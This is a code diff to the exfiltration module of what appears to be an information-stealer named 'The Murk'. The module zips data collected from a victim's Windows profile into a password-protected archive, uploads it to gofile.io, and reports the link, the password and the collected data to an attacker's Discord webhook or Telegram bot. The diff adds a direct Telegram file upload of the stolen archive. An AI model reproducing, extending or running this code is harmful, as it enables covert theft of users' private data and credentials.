@@ -1,6 +1,7 @@
 from shutil import make_archive,rmtree
 from requests import post, get
 from os import chdir,remove, environ, sep
+from os.path import basename
 from manager.logger import Log
 from random import randint
 from pyzipper import AESZipFile,ZIP_STORED,WZ_AES
@@ -13,14 +14,15 @@ def upload_file_to_gofile(file_path):
         if servers_get.status_code == 200: servers = servers_get.json()["data"]["servers"]
         else: raise Exception("Failed to get servers")
 
-        if len(servers) == 0: raise Exception("No server is available to upload")
+        if not servers: raise Exception("No server is available to upload")
 
-        server = servers[randint(0, len(servers) - 1)]
-        response = post(f'https://{server}.gofile.io/contents/uploadfile', files={'file': open(file_path, 'rb')})
-        if response.status_code == 200: return response.json()["data"]["downloadPage"]
-        else: raise Exception("Failed to upload file")
+        server = servers[randint(0, len(servers) - 1)]["name"]
+        with open(file_path, 'rb') as file:
+            response = post(f'https://{server}.gofile.io/contents/uploadfile', files={ 'file': file })
+            if response.status_code == 200: return response.json()["data"]["downloadPage"]
+            else: raise Exception("Failed to upload file")
         
-    except Exception as e: Log(f"gofile(error) ---> {e}")
+    except Exception as e: return e
 
 def MakeZip(user):
     Temp = environ['USERPROFILE'] + sep + r'AppData\Local\Temp'
@@ -68,6 +70,7 @@ def MsgForDiscord(message, url) -> str:
 def Send(sendData, msgInfo):
     user = environ['USERPROFILE']
     zipInfo = []
+    url = None
     Log("===========Conclusion===========")
 
     zipInfo = MakeZip(user)
@@ -75,29 +78,21 @@ def Send(sendData, msgInfo):
     if zipInfo == None:
         return
 
-    url = upload_file_to_gofile(f'{zipInfo[0]}')
-    remove(f'{zipInfo[0]}')
-
-    print(url)
-    print(zipInfo[1])
+    file_name = basename(zipInfo[0])
+    if sendData[0] == 0: url = f"<a href='{upload_file_to_gofile(f'{zipInfo[0]}')}'>Link</a>"
     
-    message = f"<u><b>🛑hey bro, see The Murk results🛑</b></u>\n<a href=\"{str(url)}\">🔗Link</a>\n📜Password: <code>{zipInfo[1]}</code>\n\n<i>⇓Collected data⇓</i>\n{msgInfo[0]}{msgInfo[1]}"
+    
+    message = f"<u><b>🛑hey bro, see The Murk results🛑</b></u>\n🔗{url or f"<code>{file_name}</code>"}\n📜Password: <code>{zipInfo[1]}</code>\n\n<i>⇓Collected data⇓</i>\n{msgInfo[0]}{msgInfo[1]}"
 
     if sendData[0] == 0:
         message = MsgForDiscord(message, url)
-        message+="\n\n\n**The Murk|by Nick Vinesmoke**"
-        message+="\n@everyone"
         try:
-            response = post(sendData[1], data=dumps({"content": message}), headers={'Content-Type': 'application/json'})
+            post(sendData[1], data=dumps({"content": message}), headers={'Content-Type': 'application/json'})
         except Exception as e:
             Log(f"Send(post) ---> {e}")
-            response = e
-        Log(f"Send(response) ---> {response}")
     if sendData[0] == 1:
-        message+="\n\n\n<b>The Murk|by Nick Vinesmoke</b>"
         try:
-            response = post(f'https://api.telegram.org/bot{sendData[1]}/sendMessage', data={"chat_id": int(sendData[2]), "text": message, "parse_mode": "HTML", "disable_web_page_preview": True})
-        except Exception as e:
-            Log(f"Send(post) ---> {e}")
-            response = e
-        Log(f"Send(response) ---> {response}")
+            post(f'https://api.telegram.org/bot{sendData[1]}/sendMessage', data={ "chat_id": int(sendData[2]), "text": message, "parse_mode": "HTML", "disable_web_page_preview": True })
+            with open(zipInfo[0], "rb") as file:
+                post(f'https://api.telegram.org/bot{sendData[1]}/sendDocument', data={ "chat_id": int(sendData[2]) }, files={ "document": (file_name, file) })
+        except Exception as e: Log(f"Send(post) ---> {e}")
